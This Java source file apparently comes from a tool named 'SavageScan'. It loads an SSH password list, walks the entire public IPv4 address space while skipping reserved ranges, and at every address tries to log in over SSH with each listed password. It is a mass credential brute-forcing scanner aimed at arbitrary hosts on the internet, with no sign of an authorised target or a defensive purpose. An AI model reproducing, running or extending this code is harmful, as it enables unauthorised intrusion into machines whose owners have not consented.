package don.savagescan.scan;

import com.github.jgonian.ipmath.Ipv4;
import com.github.jgonian.ipmath.Ipv4Range;
import com.google.gson.Gson;
import com.google.gson.stream.JsonReader;
import don.savagescan.connector.SSH;
import don.savagescan.utils.generator.IpRange;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.Resource;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

@Component
public class SavageScan {


    private final List<String> sshPasswords = new ArrayList<>();

    private final List<Ipv4Range> ipv4Ranges = new ArrayList<>();

    @Value("classpath:sshPasswords.txt")
    private Resource sshPasswordsFile;
    @Value("classpath:reservedIps.json")
    private Resource reservedIpsFile;

    public void init() throws IOException {
        Scanner s = new Scanner(sshPasswordsFile.getInputStream());
        while (s.hasNext()) {
            sshPasswords.add(s.next());
        }
        s.close();

        JsonReader reader = new JsonReader(new InputStreamReader(reservedIpsFile.getInputStream()));
        IpRange[] reservedIps = new Gson().fromJson(reader, IpRange[].class);

        Arrays.stream(reservedIps).forEach(range ->
                ipv4Ranges.add(Ipv4Range.from(range.getStart()).to(range.getEnd())));
    }

    public void start() throws IOException {
        init();

        SSH ssh = new SSH();
        Ipv4 start = Ipv4.FIRST_IPV4_ADDRESS;

        do {
            Ipv4 current = start.next();

            for (Ipv4Range ipRange : ipv4Ranges) {
                if (ipRange.contains(current)) {
                    current = ipRange.end();
                    break;
                }
            }
            start = current;

            ssh.setHost(start.toString(), sshPasswords);
            ssh.tryConnections();

        } while (start.hasNext());
    }
}
